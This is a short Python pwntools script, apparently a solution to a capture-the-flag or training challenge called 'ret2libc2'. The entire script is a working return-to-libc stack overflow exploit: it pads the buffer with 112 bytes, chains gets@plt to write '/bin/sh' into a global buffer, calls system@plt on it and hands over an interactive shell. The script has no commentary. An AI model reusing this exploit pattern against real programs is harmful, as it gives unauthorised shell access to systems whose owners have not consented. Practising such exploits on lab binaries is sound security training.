from pwn import *

io = process('./ret2libc2')
elf = ELF('./ret2libc2')

gets_plt_address = elf.plt['gets']
system_plt_address = elf.plt['system']
buf2_address = elf.symbols['buf2']

payload = b'A'*112 + p32(gets_plt_address) + p32(system_plt_address) + p32(buf2_address) + p32(buf2_address)

io.sendline(payload)
io.sendline(b'/bin/sh')

io.interactive()


